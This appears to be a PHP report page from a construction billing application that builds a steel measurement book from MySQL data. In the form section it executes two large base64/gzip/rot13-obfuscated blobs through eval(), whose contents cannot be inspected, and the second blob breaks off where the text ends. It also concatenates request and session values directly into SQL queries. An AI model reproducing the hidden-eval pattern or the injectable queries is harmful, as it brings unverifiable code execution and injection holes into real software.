<?php
@ob_start();
require_once 'library/config.php';
require_once 'library/functions.php';
require_once 'library/binddata.php';
include "library/common.php";
include "sysdate.php";
checkUser();
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
$NextMbIncr = 0; $UsedMBArr = array();
$msg = '';
$staffid = $_SESSION['sid'];//echo $staffid;
$userid = $_SESSION['userid'];
$mbooktype = "S";
function dt_format($ddmmyyyy) {
    $dt = explode('/', $ddmmyyyy);
    $dd = $dt[0];
    $mm = $dt[1];
    $yy = $dt[2];
    return $yy . '-' . $mm . '-' . $dd;
}
function dt_display($ddmmyyyy) {
    $dt = explode('-', $ddmmyyyy);
    $dd = $dt[2];
    $mm = $dt[1];
    $yy = $dt[0];
    return $dd . '/' . $mm . '/' . $yy;
}
function getWordWrapCount($description,$char)
{
	$wrap_cnt 	= 0; 
	$descwork 	= "";
	$char_no 	= $char;
	$work_desc 	= $description;
	$desc 		= wordwrap($work_desc,$char_no,'<br>');
	$exp_line 	= explode('<br>', $desc);
	$wlcnt 		= count($exp_line);
	for($xc=0; $xc<$wlcnt; $xc++)
	{
		if($exp_line[$xc] != "")
		{
			$wrap_cnt++;
			$descwork .= $exp_line[$xc]."<br/> ";
		}
	}
	return array($descwork, $wrap_cnt);
}
/*if($_POST['back'])
{
    header('Location: Generate_Staff_Wise.php');
}*/

if(in_array($_SESSION["zone_id"],$_SESSION['StlTotalGenZoneArr'])){
	/// Already Exist So no need to push
}else{
	array_push($_SESSION['StlTotalGenZoneArr'],$_SESSION["zone_id"]);
}
$NotGenerate = count($_SESSION['StlTotalMeasZoneArr']) - count($_SESSION['StlTotalGenZoneArr']); 

$sheetid		=	$_SESSION["sheet_id"]; 
$fromdate 		= 	$_SESSION['fromdate'];
$todate 		= 	$_SESSION['todate'];
$mbookno 		= 	$_SESSION["mb_no"];  
$mpage 			= 	$_SESSION["mb_page"]; 
$rbn 			= 	$_SESSION["rbn"];
$steelmbno_id 	= 	$_SESSION["mbno_id"];
$abstmbookno 	= 	$_SESSION["abs_mbno"];
$oldmbookno 	=	$mbookno;
$oldmbookpage 	=	$mpage;
$zone_id 		= 	$_SESSION["zone_id"];
//$temp_sql = "DELETE FROM temp WHERE flag =3 OR flag =2 AND usersid = '$userid'";
//echo $temp_sql;exit;
         //$res_query = dbQuery($temp_sql);
if(($zone_id != "") && ($zone_id != "all"))
{
	$zone_clause = " AND mbookheader.zone_id = '".$zone_id."'";
}
else
{
	$zone_clause = "";
}

$UsedMBArr[$mbookno][0] = $mpage;

if($_GET['varid'] == 1)
{
	$deletequery	=	mysql_query("DELETE FROM oldmbook WHERE sheetid = '$sheetid' AND mbook_type = 'S' AND staffid = '$staffid'");
	$deletequery_1	=	mysql_query("DELETE FROM mbookgenerate WHERE sheetid = '$sheetid'");
}
if($_GET['newmbook'] != "")
{
$newmbookno = $_GET['newmbook'];
$newmbookpage_query = "select mbpage, allotmentid from mbookallotment WHERE sheetid = '$sheetid' AND staffid = '$staffid' AND active = '1' AND mbno = '$newmbookno'";
$newmbookpage_sql = mysql_query($newmbookpage_query);
$newmbookpage = @mysql_result($newmbookpage_sql,0,'mbpage')+1;
}
$Mbsteelgeneratedelsql = "DELETE FROM mbookgenerate_staff WHERE flag =2 AND sheetid = '$sheetid' AND staffid = '$staffid' AND rbn = '$rbn' AND zone_id = '$zone_id'";
$Mbsteelgeneratedelsql_qry = mysql_query($Mbsteelgeneratedelsql);
function MeasurementSteelinsert_staff($fromdate,$todate,$sheetid,$mbookno,$mpage,$totalweight_MT,$rbn,$userid,$subdivid,$divid,$staffid,$abstmbookno,$zone_id)
{  
   
   $querys="INSERT INTO mbookgenerate_staff set staffid = '$staffid', sheetid='$sheetid',zone_id='$zone_id',divid='$divid',subdivid='$subdivid',
       fromdate ='$fromdate',todate ='$todate' ,mbno='$mbookno',flag=2,rbn='$rbn',
            mbgeneratedate=NOW(), mbpage='$mpage', abstmbookno='$abstmbookno', mbtotal='$totalweight_MT', active=1, userid='$userid', is_finalbill = '".$_SESSION["final_bill"]."'";
 //echo $querys."<br/>";
   $sqlquerys = mysql_query($querys);
}
function check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$newmbookno,$table1,$newmbookpage)
{
	$_SESSION['last_row_check'] = 1;
		if($mpage >= 100) { $mbookno = $newmbookno; /*$mpage = "GG".$newmbookpage;*/ }
		$x1 = "<tr>";
		$x1 = $x1."<td width='1087px' class='labelcenter' style='text-align:center;border-style:none' colspan='16'>"."<br/>Page ".$mpage."</td>";
		$x1 = $x1."</tr>";
		$x1 = $x1."</table>";
		$x1 = $x1."<p  style='page-break-after:always;'></p>";
		$x1 = $x1.'<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" class="label" style="border:none;">
				<tr style="border:none;"><td colspan="9" align="center" style="border:none;"><br/>Steel M.Book No. '.$mbookno.'&nbsp;&nbsp;<br/>&nbsp;</td></tr>
				</table>';
		$x1 = $x1.$tablehead; 
		$x1 = $x1.'<table width="1087px" border="0" cellpadding="3" cellspacing="3" align="center" bgcolor="#FFFFFF">';
		$x1 = $x1.$table1;
		echo $x1;
}
function display_carry($sumst,$mbookno,$mpage,$newmbookno,$decimal,$newmbookpage)
{
	if($mpage >= 100) { $page = $newmbookpage; $mbookno = $newmbookno;} else { $page = $mpage + 1; }
	$tmb2 = $sumst;
	$explodedval = explode("@",$tmb2); 
	for($i=0;$i<count($explodedval);$i++)
	{
	   if($explodedval[$i] != "")
	   {
		  $expval = explode("*",$explodedval[$i]); 
		  if($expval[0] == 8){ $tot8 = $tot8 + $expval[1]; }
		  if($expval[0] == 10){ $tot10 = $tot10 + $expval[1]; }
		  if($expval[0] == 12){ $tot12 = $tot12 + $expval[1]; }
		  if($expval[0] == 16){ $tot16 = $tot16 + $expval[1]; }
		  if($expval[0] == 20){ $tot20 = $tot20 + $expval[1]; }
		  if($expval[0] == 25){ $tot25 = $tot25 + $expval[1]; }
		  if($expval[0] == 28){ $tot28 = $tot28 + $expval[1]; }
		  if($expval[0] == 32){ $tot32 = $tot32 + $expval[1]; }
		  if($expval[0] == 36){ $tot36 = $tot36 + $expval[1]; }
		  
		  if($expval[0] == 'c'){ $totc = $totc + $expval[1]; }
		}
	} 
	if($tot8 == 0) { $tot8 = ""; } else { $tot8 = number_format($tot8,$decimal,".",","); }
	if($tot10 == 0) { $tot10 = ""; } else { $tot10 = number_format($tot10,$decimal,".",","); }
	if($tot12 == 0) { $tot12 = ""; } else { $tot12 = number_format($tot12,$decimal,".",","); }
	if($tot16 == 0) { $tot16 = ""; } else { $tot16 = number_format($tot16,$decimal,".",","); }
	if($tot20 == 0) { $tot20 = ""; } else { $tot20 = number_format($tot20,$decimal,".",","); }
	if($tot25 == 0) { $tot25 = ""; } else { $tot25 = number_format($tot25,$decimal,".",","); }
	if($tot28 == 0) { $tot28 = ""; } else { $tot28 = number_format($tot28,$decimal,".",","); }
	if($tot32 == 0) { $tot32 = ""; } else { $tot32 = number_format($tot32,$decimal,".",","); }
	if($tot36 == 0) { $tot36 = ""; } else { $tot36 = number_format($tot36,$decimal,".",","); }
	if($totc == 0) { $totc = ""; } else { $totc = $totc; }
	$row_co = "<tr height=''>";
	
	$row_co = $row_co."<td width='' colspan='4' class='labelcenter labelheadblue' style='text-align:right'>"."C/o to Page ".($page+0)."/ Steel MB No. ".$mbookno."</td>";
	$row_co = $row_co."<td width='' class='labelbold' style='text-align:right'></td>";
	$row_co = $row_co."<td width='' class='labelbold' style='text-align:right'>".$totc."</td>";
	$row_co = $row_co."<td width='' class='labelbold' style='text-align:right'></td>";
	$row_co = $row_co."<td width='7%' class='labelcenter' style='text-align:right'>".$tot8."</td>";
	$row_co = $row_co."<td width='7%' class='labelcenter' style='text-align:right'>".$tot10."</td>";
	$row_co = $row_co."<td width='7%' class='labelcenter' style='text-align:right'>".$tot12."</td>";
	$row_co = $row_co."<td width='7%' class='labelcenter' style='text-align:right'>".$tot16."</td>";
	$row_co = $row_co."<td width='7%' class='labelcenter' style='text-align:right'>".$tot20."</td>";
	$row_co = $row_co."<td width='7%' class='labelcenter' style='text-align:right'>".$tot25."</td>";
	$row_co = $row_co."<td width='7%' class='labelcenter' style='text-align:right'>".$tot28."</td>";
	$row_co = $row_co."<td width='7%' class='labelcenter' style='text-align:right'>".$tot32."</td>";
	$row_co = $row_co."<td width='6%' class='labelcenter' style='text-align:right'>".$tot36."</td>";
	//$row_co = $row_co."<td width='2%' class='labelcenter'></td>";
	$row_co = $row_co."</tr>";
	//$row_co = $row_co."<tr height='' style='text-align:center;border-style:none'>";
	//$row_co = $row_co."<td width='100%' class='labelcenter' style='text-align:center;border-style:none' colspan='16'>"."<br/>Page ".$mpage."</td>";
	//$row_co = $row_co."</tr>";
	echo $row_co;
}
$staff_design_sql 	= 	"select staff.staffname, designation.designationname from staff INNER JOIN designation ON (designation.designationid = staff.designationid) WHERE staff.staffid = '$staffid' AND staff.active = 1 AND designation.active = 1";
$staff_design_query = 	mysql_query($staff_design_sql);
$staffList 			= 	mysql_fetch_object($staff_design_query);
$staffname 			= 	$staffList->staffname;
$designation 		= 	$staffList->designationname;
$wodataquery 		= 	"SELECT sheet_id, sheet_name, work_order_no, work_name, tech_sanction, name_contractor, computer_code_no, agree_no, rbn FROM sheet WHERE sheet_id = '$sheetid' ";
$wodataquerysql 	= 	mysql_query($wodataquery);
if ($wodataquerysql == true) 
{
    $Res 				= 	mysql_fetch_object($wodataquerysql);
    $work_name 			= 	$Res->work_name;    
	$tech_sanction 		= 	$Res->tech_sanction;
    $name_contractor 	= 	$Res->name_contractor;    
	$agree_no 			= 	$Res->agree_no; 
	$work_order_no 		= 	$Res->work_order_no; 
	$ccno 				= 	$Res->computer_code_no;
   // if($Res->rbn  ==0) { $runn_acc_bill_no =1;  } else { $runn_acc_bill_no =$Res->rbn + 1;}
   $runn_acc_bill_no 	= 	$rbn;
}
	
$length = strlen($work_name);
//echo $length."<br/>";
$start_line = ceil($length/130);
//echo $start_line;
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
$NextMBFlag = 0; $NextMBList = array(); $NextMBPageList = array();
if($_POST["modal_btn_next_mb"] == " NEXT "){
	$NextMBFlag = 1;
	$TotalNoList 	= $_POST['txt_no']; //print_r($TotalNoList);exit;
	rsort($TotalNoList);
	foreach($TotalNoList as $NoKey => $NoValue){ 
		//$UsedMBArr[$MBStartVal][0] = $NextMBPageList[$MBStartKey];
		$SelectMB 		= $_POST['txt_next_mb'.$NoValue]; 
		$SelectMBPage 	= $_POST['txt_next_mbpage'.$NoValue];
		if($SelectMBPage != ''){
			array_push($NextMBList,$SelectMB); //echo $SelectMBPage."SS<br/>";
			array_push($NextMBPageList,$SelectMBPage);
			$UsedMBArr[$SelectMB][0] = $SelectMBPage;
		}
		
	}
}

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
        <title>Steel M.Book</title>
        <link rel="stylesheet" href="script/font.css" />
        
    </head>
		<!--<script language="javascript" type="text/javascript" src="script/Date_Calendar.js"></script>
		<script language="javascript" type="text/javascript" src="script/validfn.js"></script>
		<link rel="stylesheet" href="css/button_style.css"></link>
	 	<link rel="stylesheet" href="js/jquery-ui.css">
	  	<script src="js/jquery-1.10.2.js"></script>
	  	<script src="js/jquery-ui.js"></script>
	  	<link rel="stylesheet" href="/resources/demos/style.css">-->
	  	<script src="js/jquery-1.10.2.js"></script>
		<link rel="stylesheet" href="css/chosen.min.css">
   	 	<script src="js/chosen.jquery.min.js"></script>
		<link href="bootstrap-dialog/css/bootstrap-min.css" rel="stylesheet" type="text/css" />
		<script src="bootstrap-dialog/js/bootstrap.min.js"></script> <!---IMP-->
		<link href="bootstrap-dialog/css/bootstrap-dialog.min.css" rel="stylesheet" type="text/css" />
		<script src="bootstrap-dialog/js/bootstrap-dialog.min.js"></script>
  <script>
  	function goBack(){
	   	url = "Generate_Staff_Wise.php";
		window.location.replace(url);
	}
  	/*$(function() {
		$(".dialogwindow").dialog({ autoOpen: false,
			minHeight: 200,
			maxHeight:200,
			minWidth: 300,
			maxWidth: 300,
			modal: true,
		});
        $(".dialogwindow").dialog("open");
		//$("body").css({ overflow: 'hidden' });
        $( ".dialogwindow" ).dialog( "option", "draggable", false );
       	$('#btn_cancel').click(function(){
			$(".dialogwindow").dialog("close");
			window.location.href="Generate_Staff_Wise.php";
		});
        $('#btn').click(function(){
			var x = $('#newmbooklist option:selected').val();
			if(x == ""){
				var a="* Please select Next Mbook number";
				$('#error_msg').text(a);
				event.preventDefault();
				event.returnValue = false;
			}else{
				$(".dialogwindow").dialog("close"); 
				//$("body").css({ overflow: 'scroll' });      
				var newmbookvalue = $("#newmbooklist option:selected").text(); //alert(newmbookvalue);
				var oldmbookdetails = document.form.txt_steelmbno_id.value;
				$.post("GetOldMbookNo.php", {oldmbook: oldmbookdetails}, function (data) {
					window.location.href="SteelMBook_Staff_Wise.php?newmbook="+newmbookvalue;
					return false; // avoid to execute the actual submit of the form.
				});
			}
		});
		$.fn.validatenewmbook = function(event){ 
			if($('#newmbooklist option:selected').val()==""){ 
				var a="Please select Next Mbook number";
				$('#error_msg').text(a);
				event.preventDefault();
				event.returnValue = false;
				//return false;
			}else{
				var a="";
				$('#error_msg').text(a);
			}
		}
		$("#newmbooklist").change(function(event){
			$(this).validatenewmbook(event);
		});		 
	});*/
</script>
<style type="text/css" media="print,screen" >
	table{ border-collapse: collapse; }
	td { border: 1px solid #CACACA; }
	.ui-dialog > .ui-widget-header {background: #20b2aa; font-size:12px;}
	.labelcontent{
		font-family:Microsoft New Tai Lue;
		font-size:12pt;
		color:#000000;
	}
	.label, .labelcenter{
		color:#0000CD;
	}
	.ui-dialog-titlebar-close {
		visibility: hidden;
	}
	.submit_btn{
		position:absolute;
		border:none;
		top:110px;
		left:80px;
		font-weight:bold;
		font-size:12px;
	}
	.cancel_btn{
		position:absolute;
		border:none;
		top:110px;
		left:160px;
		font-weight:bold;
		font-size:12px;
	}
	.submit_btn:hover {
     	color:#000000;
     	-moz-box-shadow: 0px 1px 4px rgba(0,0,0,5);
     	-webkit-box-shadow: 0px 1px 4px rgba(0,0,0,5);
      	box-shadow:0px 1px 4px rgba(0,0,0,5);
	  	padding: 0.3em 1em;
	}
	.cancel_btn:hover {
		color:#000000;
		-moz-box-shadow: 0px 1px 4px rgba(0,0,0,5);
		-webkit-box-shadow: 0px 1px 4px rgba(0,0,0,5);
		box-shadow:0px 1px 4px rgba(0,0,0,5);
		padding: 0.3em 1em;
	}
	.labelheadblue{
		color:#0000CD;
		font-weight:bold;
		font-size:12px;
	}
	.labelcontentblue{
		color:#0000CD;
		font-weight:bold;
		font-size:12pt;	
	}
    .textboxcobf{
		width:223px; 
		border:none; 
		text-align:right;
		font-weight:bold;
		color:#0000CD;
	}
 	.title{
		font-family:Verdana, Arial, Helvetica, sans-serif;
		color:#FFFFFF; 
		border:none; 
		font-size:16px;
		font-weight:bold;
	}
	.label, .labelcenter, .labelheadblue{
		font-size:13px;
	}
</style>
<script type="text/javascript">
	window.history.forward();
	function noBack() { window.history.forward(); }
</script>
   <body bgcolor="#000000" oncontextmenu="return false"onload="noBack();" onpageshow="if (event.persisted) noBack();" onUnload="" style="padding:0; margin:0;">
<table width="1087px" style=" text-align:center; left:92px;" height="56px" align="center" bgcolor="#1babd3" class=''>
	<tr style="position:fixed;">
		<td class="title"  width="1086px"  height="56px" align="center" bgcolor="#1babd3">Steel Measurement Book</td>
	</tr>
</table>
        <form name="form" method="post" style="">
		<input type="hidden" name="hid_staffid" id="hid_staffid" value="<?php echo $staffid; ?>" />
		<input type="hidden" name="hid_sheetid" id="hid_sheetid" value="<?php echo $sheetid; ?>" />
		<input type="hidden" name="hid_userid" id="hid_userid" value="<?php echo $userid; ?>" />
		<input type="hidden" name="txt_steelmbno_id" value="<?php echo $steelmbno_id."*".$mbookno."*"."S"."*".$staffid."*".$sheetid."*".$zone_id; ?>" id="txt_steelmbno_id" />
<?php
			eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

            ?>
            <?php echo $table2; $tablehead = $table;?>

            <table width="1087px" border="0" cellpadding="3" cellspacing="3" align="center" bgcolor='#FFFFFF'>
			<?php echo $table1; ?>
                <?php 
				 $CouplerTotal = 0;
eval(str_rot13(gzinflate(str_rot13(base64_decode('LUrHDrToEXwaeNc3ZZBC5JwzFwuGnGZtbcP+HiFTX+phmuqqc6mH+++tP5L1Hsrl72QoFgz577xZ6bz8nQ9ald//H/ylVQOYF7JhrdBHFikb3OLcFN30E3/VEzz/goz6u0hB897liLreP4SJwj35F+Q8kITwkPdBUsQ5KajwzuU42r4TBL4X6Ii/E8o7utafkmw6LLjYO0YdAishx6paJmyt48M18pH/Lmr71lMTvYTQvbael2hhF0uofw08Alu3Rh3XqX65QyHqQNorzrs/I7zm4mTAcHRa/0zG4QE4yKk2SGrAcJ4ebz0uoFvHYlCAqk7sZKWPboVhbTtrd5aGKsQX3JUEck0Z91WCwHC3bunJikoqnQNpUbZNSBeTVQbcUEUs3euqM/bwAgngkmgWDIOpFjfTHDLNvTZgMJ5Od3GAPOssW2/xRruHN1mn7fgyg58iqm2PKHsMHn4yGsv2HItfjvVfRPcBjOtFXdbrmTwuLj1ndh2A7QB920P6eCS1ZpRLljE80rhl44h7Z6ntYjeZWxv6jbN+dUDvIHkbqbSKRz/ahpGTxjc+c1Ttd34STnJy8DA7B8H+Ygj8TtZe545ouXfuHsoZqVSiCDIh76tgNymne3IF2yn3+j57u7x3pEPet+FjI6AxP/8Q5zVGBDZ3UrCr0lWkPng7bkOFasMCJh2w5+qX1hbxUKtBPW4mKFsdpjMJEecWrim3/00rxPzeGQHoY5XLtyuubH1PnAMYsh3fxFvKPTEDymUGNblNiVlOig2u8PNQktcXvATa3tGMAsePpV09HHxPrFSKVL+LvNyEKJzu8U4CRsy/0b2XF5CiFPoXzjUZ/fuwJRblMrVKa0zhfkPWeNeqlGBMtd1N29a/VaNyvboq0KrxdvZYU6jyH/bq7VY8QI//GJZ3RV5QZinG0Hk1ElpG+ZyNzZw0vM4MrS01dKBcPl8DCfjnhDML+PLZW3+IAjv6xbjSlVB05dLdwZJSf8RNS8A9VWo0MAtz7nI6o0biNtjreECVCJxLsMO2LblwjrKv6cKoz6U1n4Rrs7fe8FL+kN2EoNo0Dq6Rcfsr5YF3NeXzmjLHpKr7XVAFoHhcGmS+KdTviqxviAXV9wGYhZBzOdRsZjDkDXBgTGlh/cq7EQv5hG0BtCqZ5uUVtaW4IV66SJ7drNM9k0oWS/lnr1BH5FDPg2HvFiAAzTunky1wxIue5+zglMvYMxRwXfZXQzZxBOQ3AKwrfX5Sv7cFlTXddU/UH+2RxPtKWKUji/LR2E84KkcjKt1PDgbMMkL4eXArcSP8lRxDXWSq4EAxNZelMe4gEAQ4aAKzcWVVwETfdimtYJz4W6U2TVyjakDm0ROvSMgPFeHCVwaPKY0FP9jAqrWGZmrMUUA4n0Mcun3wDDFLu3BOrUWef3Z7jxUKi8h9vANns7uYZWxROufZBvw2al1E8LRoEP4egp3ezWFifthuJpqoiuYXMP7Ng2dB8UlCglOjnlfr3jtL4wRwcLfYcs1Reked+K4rvTbGAt8n3yQXopBA+pcNWecxnoH/wnUbo/WSW5yRaFw12ivO1JiZ5QUvIFqBe0jcKW83raDz6WqcYdOY5hzBZs5WvAHpXIKMcqyS/YaE483TsdE6C4ozFNwnlFJQRSMeC5+9MdzUFrouGneJVWzZhFTydxIZtjn2/fS7BmgGjbJDg+ZxIp6/mEHbkgnrBJeVNYbICqkTbF9N70FIlDe0cQSU0qBozfteASOgUNLFTHubAkTpYKIs7kvmJSqNUJyB4X1gwk/XfIrSC600zuO6NYABXwGH43veYL4Au3DY1r1P09VijntUNxuq